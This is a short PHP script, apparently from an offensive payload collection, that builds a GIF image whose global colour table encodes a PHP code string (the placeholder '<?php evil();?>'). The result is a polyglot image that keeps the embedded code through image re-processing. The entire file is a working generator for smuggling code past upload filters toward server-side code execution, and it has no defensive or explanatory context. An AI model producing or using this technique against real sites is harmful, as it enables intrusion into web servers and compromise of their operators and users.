<?php
// createGIFwithGlobalColorTable.php
$_file="example.gif";
$_payload="<?php evil();?>";
$_width=200;
$_height=200;
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !"; exit();
}
$im = imagecreate($_width, $_height);
$_hex=unpack('H*',$_payload);

$colors_hex=str_split($_hex[1], 6);

for($i=0; $i < count($colors_hex); $i++){
  $_color_chunks=str_split($colors_hex[$i], 2);
  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
  imagesetpixel($im,$i,1,$color);
}

imagegif($im,$_file);
?>